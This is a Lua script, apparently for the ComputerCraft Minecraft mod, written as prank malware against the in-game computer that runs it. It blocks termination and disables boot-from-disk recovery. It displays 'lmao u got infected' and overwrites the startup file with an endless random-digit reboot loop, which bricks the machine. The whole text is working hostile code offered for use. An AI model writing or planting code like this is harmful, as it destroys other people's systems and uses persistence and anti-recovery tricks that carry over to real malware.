-- disable startup
settings.set("shell.allow_disk_startup", false)
settings.save()
-- gui
os.pullEvent = os.pullEventRaw
 
term.setBackgroundColor(colors.red)
term.setTextColor(colors.white)
term.clear()
 
 
local width, height = term.getSize()
local message = {
	"lmao u got infected",
	"ur pc wont start again"
}
local maxWidth = 0
for _, line in ipairs(message) do maxWidth = math.max(maxWidth, #line) end
 
-- add to autostart
local file = fs.open("startup", "w")
file.write("os.pullEvent = os.pullEventRaw term.setBackgroundColor(colors.red) term.setTextColor(colors.white) term.clear() local width, height = term.getSize() for i = 1, 200 do term.setCursorPos(math.random(1, width), math.random(1, height)) term.write(math.random(0, 1)) end os.reboot()--inf")
file.close()
 
settings.set("shell.allow_disk_startup", false)
settings.save()
-- last payload
while true do 
    local a = read() 
    settings.set("shell.allow_disk_startup", false)
    settings.save()
end
 